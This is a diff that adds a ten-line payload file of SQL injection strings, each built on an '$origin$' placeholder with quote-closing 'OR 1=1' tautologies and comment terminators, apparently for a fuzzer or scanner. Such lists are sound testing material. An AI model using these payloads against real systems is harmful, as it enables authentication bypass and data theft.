@@ -1,0 +1,10 @@
+$origin$'
+$origin$ oR 1=1
+$origin$' oR '1'='1
+$origin$ oR 1=1;--
+$origin$' oR '1'='1';--
+$origin$ oR 1=1;#
+$origin$' oR '1'='1';#
+$origin$') oR '1'='1';--
+$origin$') oR '1'='1';#
+$origin$'--
